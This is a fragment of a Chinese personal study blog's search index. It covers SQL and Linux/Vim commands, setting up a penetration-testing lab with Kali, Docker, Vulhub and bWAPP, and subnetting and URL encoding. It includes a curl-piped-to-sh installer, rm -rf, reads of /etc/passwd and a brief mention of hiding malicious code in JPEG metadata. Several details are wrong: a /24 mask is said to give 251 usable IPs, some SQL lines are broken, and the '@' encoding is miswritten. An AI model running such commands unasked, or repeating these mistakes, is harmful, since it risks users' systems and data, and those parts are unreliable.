major 为英语的改为“英语文学” UPDATE `student` SET `major` ='英语文学' WHERE `major` ='英语' ; #删掉 student_id 为 4 的那个 DELETE FROM `student` WHERE `student_id` =4; #删掉分数小于 60 的 DELETE FROM `student` WHERE `score` &lt; 60; -- 取得资料 #搜寻 student 表格中的全部资料 SELECT * FROM `student`; #排序，DESC 由高到低 SELECT * FROM `student` ORDER BY `score` DESC; # 先根据 score 排序，score 相同则根据 student_id 排序 SELECT * FROM `student` ORDER BY `score`,`student_id` DESC; #只要前两笔资料 SELECT * FROM `student` LIMIT 2; #找到分数前三低的 SELECT * FROM `student` ORDER BY `score`; LIMIT 3; #找到分数前三高的 SELECT * FROM `student` ORDER BY `score` DESC; LIMIT 3; 参考： 【数据库】SQL 3小时快速入门_bilibili（已看） SQL教程 - 廖雪峰的官方网站 (liaoxuefeng.com) 【狂神说Java】MySQL最新教程通俗易懂（已看） SQLBolt - Learn SQL - SQL Lesson 2: Queries with constraints (Pt. 1)","tags":["SQL","数据库"]},{"title":"Linux Vim 命令","path":"/2021/01/09/Linux 、Vim 命令/","content":"频次最高 Kali 虚拟机 IP ifconfig ip add # 复制文件或目录，将 old.txt 复制到当前目录并且改名为 new.txt cp 文件名 文件名 cp old.txt new.txt 显示根目录的所有下一级目录 tree -L 1 # 重命名 mv &lt;old_name&gt; &lt;new_name&gt; 登录与注销 1)\tsudo useradd lilei //添加用户 (不能被立即使用，需设置密码 sudo passwd lilei) 2)\tsudo adduser lilei //添加用户 3)\tlogin //登录或切换用户 4)\tlogout //注销用户（命令行） exit(shell-退出控制台) 5)\tshutdown -h 10 //10分钟后自动关机\tshutdown -c //取消 6)\thalt(root用户) //关闭所有进程后自动关机 7)\tpoweroff //同上 8)\tshutdown -r 10 //十分钟后自动重启 9)\tinit 6 //重启 （0-停机，1-单用户，2-多用户，3-完全多用户，4-图形化，5-安全模式，6-重启） 10)\treboot //重启 目录与文件 1)\tpwd //显示当前工作目录 2)\tmkdir mydir //创建工作目录 3)\tcd mydir //更改工作目录 4)\trmdir mydir //删除工作目录 5)\ttouch myfile //创建文件 6)\tmv myfile mydir //移动目录或文件 7)\tcp myfile myfir //复制目录或文件 8)\trm -rf mydir //删除目录或文件 9)\tls -l myfile //查看文件最后被编辑时间 10)\tls -lu myfile //查看文件最后被访问时间 11)\ttouch -at 01011212 myfile //修改文件最后被访问时间 12)\tls //列出所有文件和目录 13)\tls -a //查看所有文件 14)\tls -i //显示文件索引节点号 15)\tls -l // 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出 16)\tls -m //以逗号分隔 17)\tsudo apt-get install tree 18)\ttree -l//以树状图列出目录内容 19)\ttree -a //所有 20)\ttree -i //不以阶梯状 21)\ttree -s //列出文件或目录大小 22)\ttree -t //按更改时间 tree ./templates // 选中指定文件 23)\tfile -b myfile //显示目录或文件的详细信息 24)\tstat myfile //同上 文件内容显示 1)\tcat &gt; myfile //创建文件并编辑内容（ctrl+D结束编辑） 2)\tcat -n myfile //查看文件 3)\tchmod [u/g/o/a][+/-/=][r/w/x] myfile //更改文件权限 u-user,g-group,o-others,a-all . +-添加,--删除,=-重置 . r-read读（4），w-write写（2），x-execute执行（1） 4)\tmore myfile //分页往后显示文件（Space空格） 5)\tless myfile //分页自由显示文件（Page Down / Page Up） 6)\thead (-10) myfile //指定显示文件前若干行（默认前10） 7)\ttail (-10) myfile //指定显示文件后若干行（默认后10） 文件内容处理 1)\tsort myfile //对文件内容进行排序 2)\tsort -r myfile //逆序 3)\tuniq myfile //检查文件中的重复内容 4)\tgrep （-c）‘a’ myfile //在文件中查找指定内容 (显示行号) 5)\tdiff myfile01 myfile02 //对不同文件进行比较 6)\tdiff3 myfile01 myfile02 myfile03 //三个文件 7)\tsdiff myfile01 myfile02 //合并 8)\tcmp myfile01 myfile02 //通过字节对不同文件进行比较 9)\tcomm myfile01 myfile02 //对有序文件进行比较 10)\tcut -b(-c)(-d) 2(3) myfile //对文件内容进行剪切 11)\tpaste myfile02 myfile01 //对文件内容进行粘贴 02-）01 12)\twc （-参数） myfile //对文件内容进行统计 （c-字符数,w-单词数,l-行数） 压缩 1)\tzip myfile.zip myfile //压缩 2)\tzip -d myfile.zip myfile //添加 3)\tzip -m myfile.zip myfile //删除 4)\tunzip -o myfile.zip //解压（覆盖） 5)\tunzip -n myfile.zip //解压（不覆盖） 6)\tzipinfo myfile.zip //列出压缩文件信息 其他命令 1)\tclear //清除屏幕信息，和 CTrl + L 同等作用 2)\techo xx //显示文本 x=0 echo $x . echo -e \\$x . echo $(pwd) 3)\tdate //显示日期和时间（+%y 年 +%m 月 +%d日） 4)\tcal //显示当前日期 cal -y 5)\tps //查看当前进程 -A(所有) U lilei (用户lilei) 6)\tkill -9 2315 //终止某一进程 7)\tps -ef | grep Jincheng 8)\tpkill Jincheng 9)\tkillall Jincheng 10)\tlast //显示最近登录系统的用户信息-6列 11)\thistory （10） //显示历史指令-默认1000行 12)\tsudo adduser lilei sudo //给普通用户赋予root权限 13)\tsudo usermod -G sudo lilei //同上 14)\talias l=’ls’ //定义命令别名 15)\tunalias l //删除别名 16)\talias //列出别名 用到的 显示所有文件及目录，但不列出 “.” (目前目录) 及 “…” (父目录) ls-A 显示根目录的所有下一级目录 tree -L 1 查找文件 which [文件...] 管理套件 // 查询已安装的 RPM 软件信息 rpm -q[子选项][软件名] // 查看系统中已安装的所有RPM软件包列表 rpm -qa // 查看指定软件的详细信息 rpm -qi // 查询指定软件包所安装目录、文件列表 rpm -ql rpm -qf [文件或目录名] // 查询文件或者目录属于哪个 RPM 软件 rpm -qf /usr/bin/vim vim-enhanced-7.4.160-1.el7.x86_64 // 查询未安装的 RPM 软件包信息，先通过虚拟机设置把 IOS 映像放到虚拟机软件内部。因为路径很长，输入麻烦，所以先 umount /dev/sr0 mount /dev/sr0 /media/ cd /media/ ls // 安装或升级 RPM 软件 // 安装一个新的软件包 rpm -i // 升级某个 rpm 软件，若原本耒装，则进行安装 rpm -U // 更新某个 rpm 软件，若原本耒装，则放弃安装 rpm -F // 卸载 rpm -e 查看 mysql 安装与否 rpm -qa | grep mysql // 权限问题 // CentOS进入root权限 su root su // kali 进入 root sudo -s 文档编辑 // 显示行数 ls | wc -l kali 中的补全 ifc --&gt; ifconfig 以前执行过的命令，按住键盘的右键 文件搜索 注意：Linux搜索和windows是有明显区别的，Linux严格区分文件大小写。 搜索文件或者目录 find 【搜索目录】【-name或者-iname】【搜索字符】：-name和-iname的区别一个区分大小写，一个不区分大小写 find /etc -name init (精准搜索，名字必须为 init 才能搜索的到) find /etc -iname init (精准搜索，名字必须为 init 或者有字母大写也能搜索的到) find /etc -name *init (模糊搜索，以 init 结尾的文件或目录名) find /etc -name init??? (模糊搜索，？ 表示单个字符，即搜索到 init___) 根据 文件大小 搜索 比如：在根目录下查找大于 100M 的文件（100MB == 102400KB==204800数据块） find / -size +204800 在文件资料库中查找文件命令 locate【文件名】 locate docker -i 不区分大小写 在文件中搜寻字符串匹配的行并输出 grep -iv 【指定字符串】【文件】 -i 不区分大小写 -v 排除指定字符串 范例：查找 /root/install.log 文件中包含 mysql 字符串的行，并输出 grep mysql /root/install.log 系统快捷键 按住 Ctrl 的同时选中是复制 Shift 按住鼠标滚轮是粘贴 tab --- 命令或路径等的补全键 // 移动光标快捷键 Ctrl+A --- 快速移动光标到行首 Ctrl+E --- 快速移动光标到行尾 Ctrl+←/→ --- 将光标按照单词进行移动 Ctrl+F --- 将光标向右移动一个字符（相当于方向键的右键） Ctrl+B --- 将光标向左移动一个字符（相当于方向键的左键） // 剪切，粘贴，清除快捷键 复制命令：Ctrl + Insert 组合键 或 用鼠标选中即是复制。 粘贴命令：Shift + Insert 组合键 或 单击鼠标滚轮即为粘贴。 Ctrl+K --- 将光标之后的内容进行全部删除(剪切) Ctrl+U --- 将光标之前的内容进行全部删除(剪切) Ctrl+Y --- 将剪切或复制的内容进行粘贴 Ctrl+W --- 将光标之前的字符串进行删除(剪切) Ctrl+C --- 可以终止程序运行过程 Ctrl+H --- 删除光标所在处的前一个字符（相当于退格键） // 控制快捷键 ↑/↓ --- 可以调取曾经输入的历史命令 Ctrl+L --- 清屏操作 Ctrl+D --- 注销 Ctrl+S --- 进入远程连接锁屏状态 Ctrl+Q --- 解除远程连接锁屏状态 Ctrl+Z --- 可以暂停程序运行过程 // ESC 相关 ESC+.（点） --- 快速调取上一个命令最后的参数或对象信息 ESC+B --- 移动到当前单词的开头 ESC+F --- 移动到当前单词的结尾 ESC+T --- 颠倒光标所在处及其相邻单词的位置 VIM ESC 退回到正常模式——Normal Mode i 进入编辑模式——Insert Mode :wq命令行模式——保存退出 #在正常模式下 #常用 u #撤回 Ctrl +r #相当于 Ctrl +y，返回刚才撤回的那一步 w #下一个单词 e #词尾 yy #复制当前行 Shift + 滚轮 #粘贴 Shift + p #粘贴 d #删除 D #删除至行尾 &#123; #段首 &#125; #段尾 #输入之后进入编辑模式 shift + i #插前 shift + a #插后 o #新增下面一行 O / shift o #新增上面一行 :set nu\t显示行号，设定之后，会在每一行的前缀显示该行的行号 :set nonu\t与 set nu 相反，为取消行号！ 输入 / 或 ? # 在 Vim 普通模式下,输入 / 或 ? 符号就进入了搜索模式 可用vi代替vim编辑器 awk-查询命令 awk 命令详解 - 暮日温柔 - 博客园 (cnblogs.com) （1）last -n 5 列出过去登陆系统用户相关信息 （2）last -n 5 | awk ‘{print $1}’ 要求只显示登陆账号 ； $1表示登录用户，$2表示登录终端以此类推 （3）cat /etc/passwd | awk -F ‘:’ ‘{print $1}’ 这种是awk+action的示例，每行都会执行action｛print $1｝。 （4）cat /etc/passwd | awk -F ‘:’ ‘{print $1 “\\t” $7}’ 而账户与shell之间以tab键分割 “\\t” （5）cat /etc/passwd | awk -F ‘:’ ‘{print $1 “,” $7}’ 而账户与shell之间以逗号 分割&quot;，&quot; （6）cat /etc/passwd | awk -F ‘:’ ‘BEGIN {print “name,shell”} {print $1 “\\t” $7} END {print “blue,/bin/nosh”}’ 只显示/etc/passwd的账户和账户对应的shell，而账户与shell之间以逗号分割，并且在所有行添加列名name，shell，在最后一行添加&quot;blue，/bin/nosh&quot;。 （7）awk -F ‘:’ ‘/root/’ /etc/passwd 搜索/etc/passwd有root关键字的所有行 （8）awk -F ‘:’ '/root/ {print $7} ’ /etc/passwd 搜索/etc/passwd有root关键字的所有行，并显示出对应的shell","tags":["命令行工具"]},{"title":"VM，PHP - 搭建渗透环境","path":"/2021/01/02/VM，PHP - 搭建渗透环境/","content":"虚拟机 全名 用户名 密码 CentOS 7 64位 ** ** kali-linux-2022.3 ** ** Win_10 ** ** windows server 2008 ** ** Ubuntu 01 ** ** windows server 2019 ** ** VM | kali 参考： kali linux常用配置 安装 kali linux，下载预定制版本，VM 打开文件即可 Get Kali | Kali Linux kali 基础配置 设置中文： 打开命令行输入sudo -s获取 root 权限，然后输入dpkg-reconfigure locale，上下移动光标，移动到最下面的zh_CN.UTF-8，用空格可添加*代表选中了，用 Enter来确认，最后回到命令行界面，命令行输入reboot重启 zsh oh-my-zsh Oh My Zsh - 一个令人愉快的开源Zsh框架 sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; theme https://github.com/romkatv/powerlevel10k#oh-my-zsh kali | 初始设置 # 更新软件源中的所有软件列表 apt-get update # 安装https协议及CA证书 apt-get install -y apt-transport-https ca-certificates Expand / 拓展 apt-get update 更新软件源中的所有软件列表。 apt-get upgrade 更新软件。 apt-get dist-upgrade 更新系统版本。如果你对新版本软件的需求不是那么迫切，可以不执行 kali | docker Docker | CSDN 官方镜像加速 | 阿里云 容器镜像服务台 更新apt源满足下载要求 #安装docker要求内核版本kerner&gt;=3.10 #为此，先检查当前Linux系统的内核版本 uname -a #新重写sources.list中内容，一个个字母删除太久了 cho &gt; /etc/apt/sources.list #进入sources.lis重新编辑apt源 vim /etc/apt/sources.list #直接CV大法写入下面的apt源 #其他apt源 #此处，笔者仅添加中科达和阿里的，其他注释掉 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 进行系统或工具的更新 #进行系统或工具的更新（有丢丢就，先上把王者） #注：当出现正在设定软件包界面时，直接按tab+enter进行确认 apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade #礼貌性清除更新缓存 apt-get clean 采用apt安装Docker #为什么采用apt安装？因为之后采用apt源安装Docker的其他组件时，新组件与已安装的Docker容器最为匹配。 apt-get install docker docker-compose #或 apt-get install docker.io 检验Docker成功安装 #启动docker服务 service docker start #列出docker现有镜像 docker images #运行hello-world镜像 #但apt安装的docker没带有hello-world默认镜像呀，所以下面的命令不成功，它会帮你拉去该镜像下来 docker run hello-world 配置阿里云镜像加速 #阿里云镜像加速器获取网址（需注册）：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors #镜像加速器网址写入/etc/docker/daemon.json文件(可能不存在)中 vim /etc/docker/daemon.json #新建daemon.jsp文件 touch /etc/docker/daemon.json #写入内容 &#123; &quot;registry-mirrors&quot;: [&quot;https://k8a02wc3.mirror.aliyuncs.com&quot;] &#125; #退出daemon.jsp,并重启docker ESC --&gt; :wq! systemctl restart docker #其他公开Docker镜像加速源（不需注册） https://docker.mirrors.ustc.edu.cn\t#中科大 http://hub-mirror.c.163.com/ #网易 设置Docker开机自启 #设置docker开机自启 systemctl enable docker kali | docker-compose # 安装pip3 apt-get install python3-pip # 安装Docker-Compose pip3 install docker-compose # 查看docker-compose版本 docker-compose -v kali | docker Vulhub 克隆下载 Warning / 注意 认准 github，第一次下载错了是 gitte，更新滞后 git clone https://github.com/vulhub/vulhub.git 进入一个靶场环境目录 cd /root/vulhub/weblogic/CVE-2017-10271 对靶场进行编译 docker-compose build 运行此靶场 docker-compose up -d 查看启动环境 docker-compose ps -a 此环境运行的端口 通过浏览器访问http://127.0.0.1:7001/ IP地址:端口号 关闭靶场 docker-compose down kali | docker vulfocus VM | Ubuntu 从 kali 换到 ubuntu VMware虚拟机安装Ubuntu（超详细图文教程）_vm安装ubuntu_Time木0101的博客-CSDN博客 1. 基础环境 Python、JAVA、Docker 查看一下有没有环境 # ubuntu中自带了python，所以我们不需要去安装Python python3 --version pip3 --version 没有 pip，安装一下 apt install python3-pip git --version apt install git 没有 vim sudo apt-get install vim 2. 美化及其效率（快照1） ubuntu自带的office，感觉体验不如国产的WPS，所以把这个给卸了，用WPS代替。 sudo apt-get remove libreoffice-common romkatv/powerlevel10k: A Zsh theme (github.com) Themes · ohmyzsh/ohmyzsh Wiki (github.com) # 安装 Zsh sudo apt-get update sudo apt-get install zsh # 更改默认Shell：运行以下命令来将默认Shell更改为Zsh： chsh -s $(which zsh) # chatgpt 如何美化 Zsh，需要安装Oh My Zsh sudo apt-get install curl sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; # 配置agnoster主题：打开终端，编辑~/.zshrc文件。找到ZSH_THEME行，并将其设置为ZSH_THEME=&quot;agnoster&quot;。保存并关闭文件。 vim ~/.zshrc source ~/.zshrc # 更改终端透明度，及其设置壁纸 Zsh有许多可用的主题（也称为皮肤或外观），可以用于美化终端界面。以下是一些受欢迎的Zsh主题示例： agnoster：一个受欢迎的主题，具有醒目的外观和信息丰富的提示符。 powerlevel10k：一个高度可定制的主题，提供丰富的特性和配置选项。 robbyrussell：Oh My Zsh的默认主题，简洁而易于使用。 spaceship：一个现代化的主题，提供丰富的信息和可定制的选项。 bira：一个简洁但功能丰富的主题，具有易于阅读的提示符和彩色的文件路径。 pure：一个极简风格的主题，只显示必要的信息。 3. Tools java环境，JDK11、JDK18 Python环境 都通过apt安装好了，具体安装的什么版本不清楚 需要安装go环境，golang 在桌面添加了文件夹tools，里面放工具 Finger onforall FofaViewer VMware tools apt install open-vm-tools-desktop -y reboot 水泽 …… 4. 问题 01-2021年8月14日 .exe 的文件 ubuntu 无法执行 原因 在 Ubuntu 或其他类 Unix 操作系统中，无法直接执行 Windows 可执行文件（.exe 文件），因为 .exe 文件是 Windows 平台上的可执行文件格式，而 Ubuntu 使用不同的可执行文件格式。 解决办法 Wine： Wine 是一个允许在类 Unix 系统上运行 Windows 程序的兼容层。你可以在 Ubuntu 上安装 Wine，然后使用 Wine 运行 .exe 文件。使用以下命令安装 Wine： arduinoCopy code sudo apt-get install wine 然后，可以使用以下命令运行 .exe 文件： bashCopy code wine /path/to/your/file.exe VM | Windows Server 2019 Standard (桌面体验) VMware 虚拟机 中 windows server 2019 安装_虚拟机安装windows server 2019_学习的游戏的博客-CSDN博客 MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn) 本地靶场 php | bwapp 从 github 上下载到 PHP 的 WWW 文件简介 raesene/bWAPP (github.com) 在 bwapp 目录下搜索 install.php，看目录在哪。找到目录后登录http://localhost/bWAPP/app/install.php 进去之后数据库即可安装成功，接着去登录页面，账号密码也在 seeting .php 文件中 http://localhost/bWAPP/app/login.php PHP | upload-labs c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com) kali | 软件 安装软件目录参考[Kali Linux 文件系统.md](Kali Linux 文件系统.md) /home/software --&gt; 安装软件 使用 ExifTool 等特殊工具，可以轻松创建包含元数据中恶意代码的多语言 JPEG 文件。 sudo -s cd /software apt install libimage-exiftool-perl VM | Windows Server 2008 R2 Windows Server 2008 安装教程 - 知乎 在虚拟机中安装windows server 2008 - CSDN Windows Server 2008是微软一个服务器操作系统的名称，美国时间2008年2月27,微软正式发布 # 下载地址“百度网盘” # 最低系统要求 处理器：1.0GHz 32位 RAM：128MB 磁盘空间：20GB 其他要求 DVD 驱动器 VGA (800 x 600) 或更高分辨率的显示器 键盘和鼠标（或其他兼容的指点设备） Internet 访问（可能需要付费） 安装过程 ![image-20221113151558687](VM，PHP - 搭建渗透环境.assets/image-20221113151558687.png)","tags":["Kali","VM"],"categories":["网络安全"]},{"title":"计算机网络基础概念","path":"/2020/08/09/计算机网络/","content":"ip 地址 Internet Protocol Address——联网协议地址（又名网际协议地址），是IP Address的缩写。 192.168.1.1 子网掩码 子网掩码：又叫网络掩码，地址掩码。子网掩码不可以单独存在，它必须结合ip地址一起使用。 作用：只有一个，就是将某个IP地址划分成网络地址和主机地址两部分。 255.255.255.0 24 位掩码可用 ip 数 251 个 32-24=8 11111111 共 255 个 22 位掩码可用 ip 数 1019 个 1111111111 共 1023 个 20 位掩码可用 ip 数 4091 个 111111111111 共 4096 个 网段 网段：即为广播域。 效果：相同网段（广播域）可以通信 ，不同网段（广播域）不可通信。 区分不同网段的方法： 子网掩码中 255 所对应的位相同即为相同网段，不同即为不同网段（有意外情况） …… 如何判断两个 IP 地址是否在同一个网段 参考： 如何判断两个IP地址是否在同一个网段？什么是子网掩码？ - 知乎 (zhihu.com) 什么是子网掩码 子网掩码不能单独存在，它必须结合 IP 地址一起使用。子网掩码只有一个作用，就是***将某个 IP 地址划分成网络地址和主机地址两部分。*** 说的通俗的话，就是用来分割子网和区分哪些 ip 是同一个网段的，那些不是同一网段的。 例如，两个人都叫张三，但一个张三是张家村的，另一个张三是张村的，那么如何区分这两个张三分别是属于那个村的呢？得让村长来区分，就可以准确的把各自的张三领回村，那么子网掩码就相当于村长，它就是用来区分ip该ip地址是属于那个网段的。 在实际项目中，我们通常会遇到这样的 ip 地址。我们可以直接的判断，他们是同属于一个网段的 ip 地址。 ip地址：192.168.1.1 子网掩码：255.255.255.0 ip地址：192.168.1.2 子网掩码：255.255.255.0 那么对于下面这样的呢？ ip地址：192.168.1.1 子网掩码：255.255.255.0 ip地址：192.168.1.2 子网掩码：255.255.0.0 这两个ip地址虽然在不看掩码的情况下，比较像，但他们并不是同一个网段内的。 这个可以从子网掩码来判断， 192.168.1.1 255.255.255.0 是属于 192.168.1.0 网段的。 而 192.168.1.2 255.255.0.0 是属于 192.168.0.0 网段。 如何根据掩码来确定IP地址网段 如何确定子网掩码和**判断 ip 地址的网段**。 通常我们在划分 vlan 的时候会使用以下例子： 例1： 创建 vlan1：ip地址：192.168.1.1 子网掩码：255.255.255.0 创建 vlan2: ip地址：192.168.2.1 子网掩码：255.255.255.0 那么他们是不是在同一个网段呢？平时配置 ip 地址较多的朋友，可以直观的判断，他们并不是属于同一个网段，那么如何计算呢？要想判断两个 ip 地址是不是在同一个网段，只需将 ip 地址与子网掩码做与运算，如果得出的结果一样，则这两个 ip 地址是同一个子网当中。 详细计算 将ip地址 192.168.1.1 转换为二进制 11000000 10101000 00000001 00000001 将子网掩码255.255.255.0转换成二进制 11111111.11111111.11111111.00000000 然后将两者相“与（and）&quot;运算：（与运算的运算规则：0&amp;0=0；0&amp;1=0；1&amp;0=0；1&amp;1=1，即：两位同时为“1”，结果才为“1”，否则为“0”。负数按补码形式参加按位与运算） 11000000 10101000 00000001 00000001 11111111.11111111.11111111.00000000 然后得到： 11000000 10101000 00000001 00000000 转换成网络号就是：192.168.1.0 将ip地址192.168.2.1转换为二进制 11000000 10101000 00000010 00000001 将子网掩码255.255.255.0转换成二进制 11111111.11111111.11111111.00000000 然后将两者相“与（and）&quot;运算： 11000000 10101000 00000010 00000001 11111111.11111111.11111111.00000000 然后得到： 11000000 10101000 00000010 00000000 转换成网络号就是：192.168.2.0 很明显，二者的结果是不一样的，一个是网段192.168.1.0，一个是网段192.168.2.0，所以不是一个网段。 例2 ip地址1：192.168.1.1 子网掩码：255.255.252.0 ip地址2：192.168.2.1 子网掩码：255.255.252.0 很明显，我们这个和上面例1的 ip 地址是一样的，只是子网掩码不一样，如果不看子网掩码，首先可能就判断他们不是同一个网段。 这里面和上面例1中唯一变化就是子网掩码从255.255.255.0换成了255.255.252.0了，那我们来看下，他们是否属于同一个网段。 详细计算 将 ip 地址 192.168.1.1 转换为二进制 11000000 10101000 00000001 00000001 将子网掩码 255.255.252.0 转换成二进制 11111111.11111111.11111100.00000000 然后将两者相“与（and）&quot;运算： 11000000 10101000 00000001 00000001 11111111.11111111.11111100.00000000 然后得到： 11000000 10101000 00000000 00000000 转换成网络号就是：192.168.0.0 将ip地址192.168.2.1转换为二进制 11000000 10101000 00000010 00000001 将子网掩码255.255.252.0转换成二进制 11111111.11111111.11111100.00000000 然后将两者相“与（and）&quot;运算： 11000000 10101000 00000010 00000001 11111111.11111111.11111100.00000000 然后得到： 11000000 10101000 00000000 00000000 转换成网络号就是：192.168.0.0 很明显，二者的结果是一样的，都是属于 192.168.0.0 网段，所以他们是同属于一个网段。 当然，如果对子网较熟了就不需要经过这些运算了，大部分的网段可以通过分析子网掩码与 ip 地址就可以判断出来是否属于网一网段，但前提是你需要熟悉网段的原理与运算的方法。 如何根据 IP 地址推算子网掩码 确定ip地址子网掩码 大部分的情况下，我们网络中只要不超过 254 台主机的的话，子网掩码都可以设置成 255.255.255.0。那么超过了 254 台主机的话怎么办呢？ 可以划分 vlan，也可以设置成一个大网段，划分 vlan 我们就不说了，上面有例子，设置成一个大网段就有一个难点，如何确定这个大网段里面的子网掩码呢？ 例如 假设监控网络中有 600 个点位，我们现在也不想把它划分 vlan（实际项目中大部分是会划分vlan的），假设只想用一个大网段把这 600 个点位分配 ip 地址，如何设置 ip 地址，如何确实子网掩码？ **分析：**首先我们知道 600 个点位，可以使用 3 个 254 个 ip 地址段来分配。 可以使用 ip段一：192.168.0.1——192.168.0.254 ip段二：192.168.1.1——192.168.1.254 ip段三：192.168.2.1——192.168.2.254 每个网段有 254 个ip地址，完全够 600 个点位用的。 那么问题来了，如果要使这三个 ip 段在同一个网段内，那么这个大网段共同的子网掩码是多少呢？ 我们来分析下： 将ip地址192.168.0.1转换为二进制 11000000 10101000 00000000 00000001 将ip地址192.168.1.1转换为二进制 11000000 10101000 00000001 00000001 将ip地址192.168.2.1转换为二进制 11000000 10101000 00000010 00000001 转换成了二进制，可以看得出，三个ip段的二进制前面22位的是不变的，那么可以将他们表示成： ip段一：192.168.0.1/22 ip段二：192.168.1.1/22 ip段三：192.168.2.1/22 这种192.168.2.x/22形式的ip地址相信大家平时都见过，就是已经告诉了子网掩码了。 也就是说他们共同的子网掩码二进制前面22个都是1。 11111111 11111111 11111100 00000000 转换成十进制，那就是255.255.252.0，所以他们共同的子网掩码就是255.255.252.0。 认识网址 搜索关键字： URL 编码 “…Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*'(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.” “只有字母和数字[0-9a-zA-Z]、一些特殊符号“$-_.+!*'(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。” URL 编码 参考： URL编码是什么？ - 知乎 (zhihu.com) URL——详解_正在过坎的博客-CSDN博客_url详解 URL中的保留和不安全字符 (bbsmax.com) 当 URL 路径，或者查询参数中带有中文、特殊字符的时候，就需要对 URL 进行编码（采用十六进制编码格式）。URL 编码的原则是使用安全字符（即没有特殊用途或者特殊意义的字符）去表示那些不安全的字符。 为什么需要URL编码 URL 的编码格式采用的是 ASCII 码而非 Unicode，这表明 URL 中不允许包含任何非 ASCII 字符（比如中文），否则就会造成 URL 解析错误。 URL 中的某些字符会引起歧义，比如若 URL 查询参数中包含”&amp;”或者”%”就会造成服务器解析错误 URL 组成 一个 URL 的基本组件包括 协议 域名/主机\t端口号 路径 查询字符串 锚点 其中路径和查询字符串之间使用问号?隔离，示例如下： 主机 主机（host）是资源所在的网站名或服务器的名字，又称为域名。上例的主机是www.example.com。 有些主机没有域名，只有 IP 地址，比如192.168.2.15。这种情况常常出现在局域网。 端口 同一个域名下面可能同时包含多个网站，它们之间通过端口（port）区分。“端口”就是一个整数，可以简单理解成，访问者告诉服务器，想要访问哪一个网站。HTTP 协议的默认端口是80，如果省略了这个参数，服务器就会返回80端口的网站。 端口紧跟在域名后面，两者之间使用冒号分隔，比如www.example.com:80。 虚拟目录 互联网的早期，路径是真实存在的物理位置。现在由于服务器可以*模拟这些位置*，所以路径只是虚拟位置。 路径可能只包含目录，不包含文件名，比如/foo/，甚至结尾的斜杠都可以省略。这时，***服务器通常会默认跳转***到该目录里面的index.html文件（即等同于请求/foo/index.html），但也可能有其他的处理（比如列出目录里面的所有文件），这取决于服务器的设置。一般来说，访问www.example.com这个网址，很可能返回的是网页文件www.example.com/index.html。 /app/user/ 从第一个斜杠 / 开始，到最后一个斜杠 / 结束的那部分，即为虚拟目录 第一个 / 为根目录，每多一个 / 就多进入一层目录 文件名 从域名后开始算起的最后一个 / 开始，到 ? 为止 没有 ? 则到 # 为止 都没有就是到整个 URL 结束为止的那部分就为文件名 一般包含文件名和扩展名，用来指代一个 URL 所访问的具体文件或资源，它可以是图片、html 文件、css 文件，也可以是 js 文件、字体文件等等，它也可以不是某种文件，而是服务端后台执行的某段程序。 甚至可以省略不写虚拟目录和文件名，因为它们本来就不是必须的，服务器会在缺省的情况下给你定位到某个特定的文件或程序上去。 查询参数 从 ? 后到 # 结束，即图中的 ?uid=101&amp;ty=2 为查询参数 查询参数，也称为 URL 参数、查询字符串，英文名为 Query，它是用来向服务端以字符串的形式传递参数和少数数据用的 URL的参数是一个个键值对，即一个key对应一个value，多个键值对应**&amp;**连起来：例如a=1&amp;b=2 URL编码： 但参数要传递的某些值往往带有特殊字符，这些字符和 URL 标准的格式冲突，比如要传a&amp;b这样字符串，和查询参数键值对的连接符 &amp; 冲突了，若不加以区分就会产生歧义 而最简单的办法，就是对参数值进行编码，称为 URL Encoding，通过编码，就不再包含会冲突的特殊字符a&amp;b 可以改为 a%26b 锚点 #后面那部分字符串，#abc就是锚部分 锚，英文称做Reference，通常也是用来传递参数等信息，但与查询参数的本质区别就是这部分内容不会被传递到服务器端 锚一般用于页面，比如在浏览网页的时候，按个按钮突然帮你定位到页首或页面中的某个位子去了，这就是锚 现在随着前后端分离技术，尤其是 vue、reactjs 等前端框架的兴起，锚作为前端javascript程序处理的参数载体也越来越重要了 URL 字符 查询字符串中空格被编码成+号 URL 的各个组成部分，只能使用以下这些字符。 26个英语字母（包括大写和小写） 10个阿拉伯数字 连词号（-） 句点（.） 下划线（_） 此外，还有18个字符属于 URL 的保留字符，只能在给定的位置出现。比如，查询参数的开头是问号（?），也就是说，问号只能出现查询参数的开头，出现在其他位置就是非法的，会导致网址解析错误。网址的其他部分如果要使用这些保留字符，必须使用它们的转义形式。 URL 字符转义的方法是，在这些字符的十六进制 ASCII 码前面加上百分号（%） 字符 描述 用法 编码 ; 分号 保留 %3B / 斜线 保留 %2F ? 问号 保留 %3F : 冒号 保留 %3A @ “at”符号 保留 %4O = 等号 保留 %3D &amp; “和”符号 保留 %26 &lt; 小于号 不安全 %3C &gt; 大于号 不安全 %3E &quot; 双引号 不安全 %22 # 井号 不安全 %23 % 百分号 不安全 %25 &#123; 左大括号 不安全 %7B &#125; 右大括号 不安全 %7D | 竖线 不安全 %7C \\ 反斜线 不安全 %5C ^ 加字号 不安全 %5E ~ 波浪 不安全 %7E [ 左中括号 不安全 %5B ] 右中括号 不安全 %5D ` 反单引号 不安全 %60 空格 不安全 %20 举例来说，有一个网页的 URL 是foo?bar.html，即文件里面包含一个问号，那么需要写成foo%3Fbar.html。 URL 的合法字符，其实也可以采用这种转义方法，但是不建议使用。比如，字母a的十六进制 ASCII 码是61，转义形式后就是%61。因此，www.apple.com又可以写成www.%61pple.com，浏览器一样识别 。 既不属于合法字符、也不属于保留字符的其他字符（比如汉字），理论上不需要手动转义，可以直接写在 URL 里面，比如www.example.com/中国.html，浏览器会自动将它们转义，发给服务器。转义方法是使用这些字符的十六进制 UTF-8 